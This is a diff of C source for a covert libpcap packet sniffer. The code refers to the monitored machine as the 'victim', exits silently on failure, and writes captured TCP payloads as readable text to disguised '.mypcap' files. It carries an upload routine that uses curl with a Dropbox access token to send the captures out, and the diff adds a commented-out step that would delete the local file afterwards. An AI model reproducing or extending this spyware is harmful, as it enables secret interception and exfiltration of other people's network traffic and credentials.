@@ -25,10 +25,10 @@ typedef struct {
 int DATA_LINK_HDR_LEN = 14;
 
 /* Number of packet_info packets that our buffer holds */
-int PACKET_BUFFER_SIZE = 1000;
+int PACKET_BUFFER_SIZE = 10;
 
 /* Buffer to hold a certain amount of packet_info structs.  */
-packet_info* PACKET_BUFFER[1000];
+packet_info* PACKET_BUFFER[10];
 
 /* Counter for the above buffer. */
 int PACKET_BUFFER_IDX = 0;
@@ -37,10 +37,10 @@ int PACKET_BUFFER_IDX = 0;
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
 /* Dropbox access token for pushing pcap files. */
-char* DROPBOX_ACCESS_TOKEN;
+const char* DROPBOX_ACCESS_TOKEN;
 
 /* Used to check whether ip address belongs to source or destination. */
-char* VICTIM_IP;
+const char* VICTIM_IP;
 
 /* Definition for the callback function when a packet is captured */
 void packet_callback(u_char* args, const struct pcap_pkthdr* header, const u_char* packet);
@@ -68,7 +68,8 @@ int main(int argc, char** argv) {
     // Exit silently if we fail to find interface.
     return 1;
   }
-  VICTIM_IP = get_interface_ip(interface);
+  // Hack because for some reason VICTIM_IP was getting mangled in the callback
+  VICTIM_IP = strdup(get_interface_ip(interface));
   // Enable Non promiscuous mode.
   pcap_t* pc_handle = pcap_open_live(interface, BUFSIZ, 0, 1000, errbuf);
   if(pc_handle == NULL) {
@@ -135,7 +136,7 @@ void process_buffer() {
   strcpy(filename, get_system_time(buffer));
   strcat(filename, "_");
   strcat(filename, VICTIM_IP);
-  strcat(filename, ".pcap");
+  strcat(filename, ".mypcap");
   FILE* packet_file = fopen(filename, "w");
   // Process packets
   for(int i = 0; i < PACKET_BUFFER_SIZE; ++i) {
@@ -145,11 +146,19 @@ void process_buffer() {
     // Extract the unix epoch timestamp from the header and convert to readable form.
     time_t timestamp = (time_t) (header->ts.tv_sec);
     time(&timestamp);
+    // Initialize some stuff.
     char src_ip[256], dest_ip[256];
     struct ip* ip_hdr;
+    int ip_hdr_len;
+    struct tcphdr* tcp_hdr;
+    int tcp_hdr_len;
+    u_char* payload;
+    int payload_len;
     // We don't care about any info in the link-layer so skip it.
     packet += DATA_LINK_HDR_LEN;
+    // Get to the ip header and also get its size for future use
     ip_hdr = (struct ip*) packet;
+    ip_hdr_len = ip_hdr->ip_hl*4;
     // Gets the source and destination ip. We don't get port info since we filter
     // on a specific set of protocols anyway.
     strcpy(src_ip, inet_ntoa(ip_hdr->ip_src));
@@ -162,12 +171,30 @@ void process_buffer() {
     } else {
       continue;
     }
+    tcp_hdr = (struct tcphdr*) (packet + ip_hdr_len);
+    tcp_hdr_len = tcp_hdr->th_off*4;
+    payload_len = header->caplen - (DATA_LINK_HDR_LEN + ip_hdr_len + tcp_hdr_len);
+    payload = (u_char*) (packet + ip_hdr_len + tcp_hdr_len);
+    /* Print payload in ASCII, http://www.devdungeon.com/content/using-libpcap-c */
+    if (payload_len > 0) {
+      fprintf(packet_file, "Payload len: %d\n", payload_len);
+      const u_char* temp_pointer = payload;
+      int byte_count = 0;
+      while (byte_count++ < payload_len) {
+        fprintf(packet_file, "%c", *temp_pointer);
+        temp_pointer++;
+      }
+      fprintf(packet_file, "\n");
+    } else {
+      fprintf(packet_file, "Payload len: %d\n", 0);  
+    }
     fprintf(packet_file, "=======================================\n");
     fflush(packet_file);
     free(info);
   }
   free(buffer);
   //write_to_dropbox(filename);
+  //remove(filename);
 }
 
 char* get_system_time(char* buffer) {
@@ -186,6 +213,5 @@ void write_to_dropbox(char* filename) {
   strcat(buffer, "\" ");
   strcat(buffer, "https://api-content.dropbox.com/1/files_put/auto/ -T ");
   strcat(buffer, filename);
-  fprintf(stderr, "%s", buffer);
   system(buffer);
 }
